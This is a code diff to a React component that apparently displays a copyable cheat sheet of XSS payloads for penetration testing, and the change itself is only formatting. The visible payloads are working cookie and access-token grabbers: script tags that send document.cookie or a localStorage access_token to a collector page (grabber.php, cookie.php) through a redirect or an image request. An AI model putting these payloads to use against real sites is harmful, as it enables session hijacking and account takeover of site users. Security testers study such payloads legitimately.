@@ -9,13 +9,15 @@ export default (props) => {
 			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>"
 		},
 		{
-			title: "<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
+			title:
+				"<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>"
 		},
 		{
 			title: "<script>new Image().src='http://localhost/cookie.php?c='+document.cookie;</script>"
 		},
 		{
-			title: "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
+			title:
+				"<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>"
 		}
 	];
 	const BasicXSS = [
@@ -92,7 +94,7 @@ export default (props) => {
 				</Paragraph>
 				{DataGrabber.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable>
+						<Paragraph key={i} copyable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
@@ -109,7 +111,7 @@ export default (props) => {
 				<Title level={4}>Basic Payload</Title>
 				{BasicXSS.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable>
+						<Paragraph key={i} copyable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
@@ -117,7 +119,7 @@ export default (props) => {
 				<Title level={4}>Img tag payload</Title>
 				{ImgPayload.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable>
+						<Paragraph key={i} copyable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
@@ -149,7 +151,7 @@ export default (props) => {
 				<Title level={3}>XSS in SVG (short)</Title>
 				{XSSSvg.map((k, i) => {
 					return (
-						<Paragraph key={i} copyable>
+						<Paragraph key={i} copyable ellipsis={true}>
 							{k.title}
 						</Paragraph>
 					);
